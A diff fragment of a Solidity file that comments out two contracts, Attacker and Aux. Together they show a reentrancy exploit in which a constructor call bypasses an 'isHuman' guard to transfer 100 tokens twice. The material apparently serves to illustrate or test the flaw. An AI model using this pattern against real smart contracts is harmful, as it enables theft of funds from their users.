@@ -31,18 +31,18 @@ contract C {
 // then, transfer(self, attacker, 100) 
 // where self is the EOA of the attacker
 // and attacker is an instance of the Attacker contract
-contract Attacker {    
-    receive() payable external {
-        // now this contract has received 100
-        // and a new contract is instantiated, passing addresses for reentering
-        Aux att = new Aux(address(this), msg.sender);
-    }
-}
+// contract Attacker {    
+//     receive() payable external {
+//         // now this contract has received 100
+//         // and a new contract is instantiated, passing addresses for reentering
+//         Aux att = new Aux(address(this), msg.sender);
+//     }
+// }
 
-contract Aux {
-    constructor(address attacker, address sender) {
-        // within this constructor a reentrancy is performed and another 100 are transfered to the Attacker contract
-        // the isHuman guard succeedes because we are INSIDE a constructor
-        C(sender).transfer(sender, attacker, 100);
-    }
-}
+// contract Aux {
+//     constructor(address attacker, address sender) {
+//         // within this constructor a reentrancy is performed and another 100 are transfered to the Attacker contract
+//         // the isHuman guard succeedes because we are INSIDE a constructor
+//         C(sender).transfer(sender, attacker, 100);
+//     }
+// }
